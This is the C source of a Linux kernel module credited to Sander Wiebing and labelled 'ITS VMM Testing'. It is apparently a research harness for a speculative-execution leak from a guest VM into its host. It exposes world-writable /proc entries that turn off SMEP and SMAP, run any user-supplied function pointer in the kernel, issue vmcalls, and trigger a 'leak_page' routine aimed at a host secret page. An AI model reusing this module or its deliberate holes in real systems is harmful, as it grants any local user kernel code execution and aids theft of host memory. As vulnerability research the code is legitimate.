#include<linux/module.h>
#include<linux/kernel.h>
#include <asm/pgtable_types.h>
#include <asm/pgtable_64_types.h>
#include <asm/page.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include <linux/pgtable.h>

#include <linux/mm.h>
#include <linux/security.h>
#include <linux/userfaultfd_k.h>
#include <asm/io.h>

#include "lib.h"
#include "leak.h"


MODULE_AUTHOR("Sander Wiebing");
MODULE_DESCRIPTION("ITS VMM Testing");
MODULE_LICENSE("GPL");


static uint64_t read_cr4(void)
{
  uint64_t old_cr4;
  asm volatile ("mov %%cr4, %0" : "=r" (old_cr4));

  return old_cr4;
}

static void write_cr4(uint64_t new_cr4)
{

  asm volatile ("mov %0, %%cr4" :: "r" (new_cr4));

}

static ssize_t mod_disable_smap_smep(struct file *filp, char *buf, size_t len, loff_t *off) {

	int write_len;
	uint64_t old_cr4, new_cr4;
	char kbuf[] = "OK\n";

	if (*off != 0) {
		return 0;
	}

	old_cr4 = read_cr4();
	new_cr4 = old_cr4;

	if (old_cr4 & X86_CR4_SMEP) {
		pr_info("SMEP is enabled on this core, lets disable it!\n");
		new_cr4 = (new_cr4 ^ X86_CR4_SMEP);
	}

	if (old_cr4 & X86_CR4_SMAP) {
		pr_info("SMAP is enabled on this core, lets enable it!\n");
		new_cr4 = (new_cr4 ^ X86_CR4_SMAP);
	}

	if(new_cr4 != old_cr4) {
		write_cr4(new_cr4);
	}


    write_len = min(len, strlen(kbuf));
    *off += write_len;

    if (copy_to_user(buf, kbuf, write_len)) {
        return -EFAULT;
    }

	return write_len;


}



typedef void (*entry_t)(void * arg1, void * arg2, void * arg3, void * arg4,
						void * arg5, void * arg6);


static ssize_t mod_do_execute(struct file *filp, const char *buf, size_t len, loff_t *off) {

    char kbuf[256] = {0};
	void ** args;

    if (copy_from_user(kbuf, buf, min(len, (size_t) 255))) {
		return -EFAULT;
    }

    if (sscanf(kbuf, "%llx", (uint64_t *) &args) != 1) {
		pr_info("Failed reading user arg\n");
        return -EFAULT;
    }

	((entry_t) args[0])(args[1], args[2], args[3], args[4], args[5], args[6]);

    len = strlen(kbuf);
    *off += len;

    return len;
}


static ssize_t mod_do_vmcall(struct file *filp, char *buf, size_t len, loff_t *off) {

    char kbuf[256] = {0};
	void ** args;
	uint64_t ret_value = 1;


    if (copy_from_user(kbuf, buf, min(len, (size_t) 255))) {
		return -EFAULT;
    }

    if (sscanf(kbuf, "%llx", (uint64_t *) &args) != 1) {
		pr_info("Failed reading user arg\n");
        return -EFAULT;
    }

	asm volatile(
		"vmcall\n"
		: "=a" (ret_value)
		: "a" (13), "b" ((uint64_t) args[0]), "c" (args[1]), "d" (args[2]), "S" (args[3])
		:
		);


	return ret_value;

}


static ssize_t mod_leak_page(struct file *filp, const char *buf, size_t len, loff_t *off) {

    char kbuf[256] = {0};
	void ** args;

	struct config cfg = {0};

    if (copy_from_user(kbuf, buf, min(len, (size_t) 255))) {
		return -EFAULT;
    }

    if (sscanf(kbuf, "%llx", (uint64_t *) &args) != 1) {
		pr_info("Failed reading user arg\n");
        return -EFAULT;
    }


	cfg.enter_jit_chain = args[0];
	cfg.caller0 = args[1];
	cfg.fr_buf_p = args[4];

	cfg.fr_buf = args[7];
	cfg.secret_page = args[8];
	cfg.host_fr_buf = args[9];
	cfg.host_secret_page = args[10];

	cfg.leaked_bytes = args[11];

	cfg.evict_list = (void **) args[12];


	// initialize to default
	cfg.host_arg_fr_buf = cfg.host_fr_buf;
	cfg.host_arg_secret = cfg.host_secret_page;


	if (leak_page(&cfg)) {
		return 0;
	};


    len = strlen(kbuf);
    *off += len;

    return len;
}



static struct proc_ops disable_smap_smep_fops = {
	.proc_read = mod_disable_smap_smep
};

static struct proc_ops do_execute_fops = {
	.proc_write = mod_do_execute
};


static struct proc_ops leak_page_fops = {
	.proc_write = mod_leak_page
};


static struct proc_ops do_vmcall_fops = {
	.proc_read = mod_do_vmcall
};

static struct proc_dir_entry *proc_dir;


static int __init execute_caller_init(void)
{

	pr_info("initializing\n");

	proc_dir = proc_mkdir("execute_caller_vm", NULL);
	proc_create("disable_smap_smep", 0666, proc_dir, &disable_smap_smep_fops);
	proc_create("do_execute", 0666, proc_dir, &do_execute_fops);
	proc_create("leak_page", 0666, proc_dir, &leak_page_fops);
	proc_create("do_vmcall", 0666, proc_dir, &do_vmcall_fops);


	return 0;
}

static void __exit execute_caller_exit(void)
{
	pr_info("exiting\n");
	proc_remove(proc_dir);
}

module_init(execute_caller_init);
module_exit(execute_caller_exit);
